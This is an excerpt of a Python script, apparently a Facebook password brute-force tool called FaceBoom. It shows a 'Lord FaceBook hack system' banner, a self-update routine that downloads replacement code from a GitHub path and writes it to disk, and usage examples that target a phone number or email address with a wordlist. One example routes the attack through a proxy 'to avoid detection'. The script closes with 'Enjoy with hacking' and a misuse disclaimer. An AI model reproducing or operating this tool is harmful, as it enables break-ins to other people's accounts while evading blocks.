...
class FaceBoom(object):
    ...
    def banner(self,target,wordlist,single_passwd):
        ...
        print(gr+"""
==================================================================
[---]   """+wi+"""Lord FaceBook hack system"""+gr+"""        [---]
==================================================================
[---]  """+wi+"""BruteForce Facebook  """+gr+""" [---]
==================================================================
[---]         """+yl+"""CONFIG by Ahmed elshrief"""+gr+"""         [---]
==================================================================
[>] Target      :> """+wi+target+gr+"""
...
==================================\n"""+wi)
    ...
    def updateFacebook_hack():
        ...
        conn.request("GET", "/LordDZx/facebook-burte/main/core/version.txt")
        ...
        if repoVersion == currentVersion:write("  [*] The script is up to date!\n")
                ...
                conn.request("GET", "/LordDZx/facebook-burte/main/fb.py")
                newCode = conn.getresponse().read().strip().decode()
                with open("gfb.py", "w") as  facebook_hackScript:
...
Examples:
        |
     python fb.py -t 9786748546 -w worldlists.txt ===> How to operate the device without the need for a proxy or the victim's Gmail knowledge

     python fb.py -t example@example.com -w wordlists.txt ===> How to operate the device by email without the need for a proxy

     python fb.py -t example@example.com -w wordlist.txt -p 197.516.102.245:8080 ===> This is a way to work with a proxy to avoid detection or blocking the IP
""")
...
#####################                #########################
##############################################################
#This tools build by alshrief -Ahmed.R
#Enjoy with hacking - i'm not responsible for any misuse
